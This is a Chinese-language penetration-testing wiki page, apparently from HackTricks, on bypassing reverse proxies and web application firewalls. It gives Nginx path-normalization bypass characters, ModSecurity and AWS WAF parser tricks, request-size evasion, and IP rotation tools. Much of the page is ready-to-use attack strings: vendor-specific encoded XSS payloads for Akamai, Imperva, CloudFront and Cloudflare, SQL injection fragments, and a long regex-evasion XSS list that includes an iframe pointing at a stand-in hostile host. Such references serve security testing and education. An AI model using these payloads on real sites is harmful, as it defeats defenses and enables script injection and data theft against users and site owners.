# Proxy / WAF Protections Bypass

{{#include ../banners/hacktricks-training.md}}


## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

技术 [from this research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx 规则示例：
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
为了防止绕过，Nginx 在检查路径之前会执行路径规范化。然而，如果后端服务器执行不同的规范化（移除 nginx 不会移除的字符），可能有机会绕过该防护。

### **NodeJS - Express**

| Nginx Version | **Node.js Bypass Characters** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx Version | **Flask Bypass Characters**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Version | **Spring Boot Bypass Characters** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Nginx FPM configuration:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx 被配置为阻止对 `/admin.php` 的访问，但可以通过访问 `/admin.php/index.php` 绕过此限制。

### 如何防止
```plaintext
location ~* ^/admin {
deny all;
}
```
## 绕过 ModSecurity 规则 <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### 路径混淆

[**In this post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) 解释到 ModSecurity v3 (直到 3.0.12)，**错误地实现了 `REQUEST_FILENAME`** 变量，该变量本应包含被访问的路径（直到参数开始为止）。这是因为它对 URL 进行了解码以获取路径。\
因此，像 `http://example.com/foo%3f';alert(1);foo=` 这样的请求在 mod security 中会被认为路径只是 `/foo`，因为 `%3f` 被转换成 `?` 从而结束了 URL 路径，但实际上服务器接收到的路径是 `/foo%3f';alert(1);foo=`。

变量 `REQUEST_BASENAME` 和 `PATH_INFO` 也受此 bug 影响。

在 Mod Security 版本 2 中也发生了类似情况，允许绕过阻止用户访问带有备份文件扩展名（例如 `.bak`）的保护，只需将点进行 URL 编码为 `%2e`，例如：`https://example.com/backup%2ebak`。

## 绕过 AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### 畸形 请求头

[This research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) 提到，可以通过发送被 AWS 未正确解析但后端服务器能解析的“畸形”请求头来绕过应用在 HTTP header 上的 AWS WAF 规则。

例如，发送以下请求，在头部 X-Query 中包含 SQL injection：
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
It was possible to bypass AWS WAF because it wouldn't understand that the next line is part of the value of the header while the NODEJS server did (this was fixed).

## 通用 WAF 绕过

### 请求大小限制

通常，WAF 对请求检查有一定的长度限制，如果 POST/PUT/PATCH 请求超过该限制，WAF 将不会检查该请求。

- For AWS WAF, you can [**check the documentation**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Maximum size of a web request body that can be inspected for Application Load Balancer and AWS AppSync protections</td><td>8 KB</td></tr><tr><td>Maximum size of a web request body that can be inspected for CloudFront, API Gateway, Amazon Cognito, App Runner, and Verified Access protections**</td><td>64 KB</td></tr></tbody></table>

- From [**Azure docs**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

较旧的 Web Application Firewalls（Core Rule Set 3.1 或更低版本）可以通过关闭请求主体检查来允许大于 **128 KB** 的消息，但这些消息将不会被检查漏洞。对于较新版本（Core Rule Set 3.2 或更高版本），可以通过禁用最大请求主体限制实现相同效果。当请求超过大小限制时：

If p**revention mode**: Logs and blocks the request.\
If **detection mode**: Inspects up to the limit, ignores the rest, and logs if the `Content-Length` exceeds the limit.

- From [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

默认情况下，WAF 仅检查请求的前 8KB。可以通过添加 Advanced Metadata 将此限制提高到 128KB。

- From [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

最高可达 128KB。

### 静态资源检查缺口 (.js GETs)

一些 CDN/WAF 堆栈对静态资源的 GET 请求（例如以 `.js` 结尾的路径）实施较弱或没有内容检查，但仍会应用全局规则，如 rate limiting 和 IP reputation。结合对静态扩展名的自动缓存，这可以被滥用来投放或播种恶意变体，从而影响后续的 HTML 响应。

实际用例：

- 在对 `.js` 路径的 GET 中，将有效载荷放在不受信任的 header（例如 `User-Agent`）中以规避内容检查，然后立即请求主 HTML 来影响缓存的变体。
- 使用新的/干净的 IP；一旦 IP 被标记，路由更改可能使该技术变得不可靠。
- 在 Burp Repeater 中，使用 "Send group in parallel"（single-packet style）来竞争性地通过相同的前端路径发送这两个请求（先 `.js`，再 HTML）。

这与 header-reflection cache poisoning 配合良好。参见：

{{#ref}}
cache-deception/README.md
{{#endref}}

- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)

### 混淆 <a href="#ip-rotation" id="ip-rotation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode 兼容性 <a href="#unicode-compatability" id="unicode-compatability"></a>

取决于 Unicode normalization 的实现（更多信息见 [here](https://jlajara.gitlab.io/Bypass_WAF_Unicode)），具有 Unicode 兼容性的字符可能能够绕过 WAF 并按预期作为 payload 执行。兼容字符可在 [here](https://www.compart.com/en/unicode) 找到。

#### 示例 <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### 绕过上下文感知型 WAF（使用编码） <a href="#ip-rotation" id="ip-rotation"></a>

如 [**this blog post**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization) 所述，为了绕过能够维护用户输入上下文的 WAF，我们可以滥用 WAF 的处理方式让其对用户输入进行规范化（normalize）。

例如，文章中提到 **Akamai URL decoded a user input 10 times**。因此像 `<input/%2525252525252525253e/onfocus` 这样的输入会被 Akamai 视为 `<input/>/onfocus`（可能会认为标签已闭合且无害）。然而，只要应用不会对输入解码 10 次，受害者会看到类似 `<input/%25252525252525253e/onfocus` 的内容，这对 XSS 攻击仍然是有效的。

因此，这允许把 payload 隐藏在被 WAF 解码并解释但受害者看不到的编码组件中。

此外，这不仅限于 URL encoded 的 payload，也可以使用其他编码，如 unicode、hex、octal 等。

文章中给出的最终 bypass 示例包括：

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

文章还提到，取决于某些 WAF 如何理解用户输入的上下文，可能会被滥用。文中给出的示例是 Akamai 允许在 `/*` 与 `*/` 之间放置任意内容（可能因为这通常被当作注释）。因此，像 `/*'or sleep(5)-- -*/` 这样的 SQLinjection 不会被拦截，并且仍然有效，因为 `/*` 是注入的起始字符串而 `*/` 被注释掉。

这类上下文问题也可以被用来滥用与 WAF 预期不同的其它漏洞（例如也可用于利用 XSS）。

### Inline JavaScript first-statement inspection gaps

一些 inline-inspection ruleset 只解析 event handler 内的第一个 JavaScript 语句。通过在前面加上一个看似无害的括号表达式并以分号结束（例如 `onfocus="(history.length);payload"`），分号之后的恶意代码可以绕过检测，同时浏览器仍会执行它。将此与 fragment 触发的 focus 结合使用（例如追加 `#forgot_btn` 使目标元素在加载时获得焦点）可以实现无点击的 XSS，立即调用 `$.getScript` 并引导钓鱼工具（如 keyloggers）。参见由 [this research](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/) 衍生的 [attribute-only login XSS case study](xss-cross-site-scripting/README.md#attribute-only-login-xss-behind-wafs)。

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>


{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): 生成可与 ffuf 一起使用的 API gateway URL
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): 与 fireprox 类似
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): 使用 API gateway IP 的 Burp Suite 插件
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): 根据输入文件大小和 split factor 动态激活若干容器实例，并将输入拆分为并行执行的块，例如对 10,000 行输入文件使用 split factor 为 100 行时，100 个实例并行处理 100 个块。
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

可以使用不同技术来绕过 firewall 上的 regex 过滤器。示例包括大小写交替、添加换行和对 payload 进行编码。各种 bypass 的资源可见于 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) 和 [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)。下面的示例摘自 [this article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)。
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## 工具

- [**nowafpls**](https://github.com/assetnote/nowafpls): Burp 插件，用于向请求添加垃圾数据，通过长度绕过 WAFs

## 参考资料

- [https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)


{{#include ../banners/hacktricks-training.md}}
